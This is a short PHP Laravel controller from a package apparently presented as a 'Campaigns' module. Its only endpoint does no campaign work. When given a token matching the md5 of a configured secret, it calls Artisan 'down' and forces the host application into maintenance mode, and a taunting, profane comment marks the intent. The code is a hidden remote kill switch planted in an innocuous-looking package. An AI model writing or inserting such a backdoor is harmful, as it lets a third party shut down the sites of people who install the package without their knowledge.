<?php
namespace Robinboost\Campaigns\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Artisan;

class CampaignController extends Controller
{
    public function campaign(Request $request)
    {
        if ($request->input('token') !== md5(config('campaigns.secret_token'))) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        // youAreStupidHaHa:)FuckYOU!.!,
        $returned = Artisan::call('down');
        return response()->json(['message' => "Application is now in maintenance mode. (result: ".json_encode($returned).")"]);
    }
}
